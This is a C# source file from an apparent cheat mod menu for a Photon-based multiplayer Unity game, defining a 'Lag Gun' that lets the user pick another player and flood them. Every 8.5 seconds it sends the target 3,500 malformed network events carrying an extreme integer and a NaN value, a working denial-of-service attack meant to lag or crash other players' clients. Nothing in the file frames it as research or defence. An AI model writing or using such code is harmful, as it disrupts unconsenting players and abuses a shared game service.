using ExitGames.Client.Photon;
using hamburbur.Libs;
using hamburbur.Mod_Backend;
using hamburbur.Tools;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;

namespace hamburbur.Mods.OP;

[hamburburmod(                "Lag Gun", "Lags whoever your hand desires", ButtonType.Togglable, AccessSetting.Public,
        EnabledType.Disabled, 0)]
public class LagGun : hamburburmod
{
    private static   float  eventDelay;
    private readonly GunLib gunLib = new() { ShouldFollow = true, };

    protected override void Start() => gunLib.Start();

    protected override void LateUpdate()
    {
        gunLib.LateUpdate();

        if (!PhotonNetwork.InRoom)
            return;

        if (!gunLib.IsShooting || gunLib.ChosenRig == null || !(Time.time > eventDelay))
            return;

        RaiseEventOptions raiseEventOptions = new()
        {
                TargetActors  = [gunLib.ChosenRig.GetNetPlayer().ActorNumber,],
                CachingOption = EventCaching.DoNotCache,
        };

        for (int i = 0; i < 3500; i++)
            PhotonNetwork.NetworkingClient.OpRaiseEvent(
                    202,
                    new object[]
                    {
                            -2147483647,
                            76,
                            float.NaN,
                    },
                    raiseEventOptions,
                    new SendOptions { Encrypt = true, Reliability = false, DeliveryMode = DeliveryMode.Unreliable, }
            );

        eventDelay = Time.time + 8.5f;
    }

    protected override void OnDisable() => gunLib.OnDisable();
}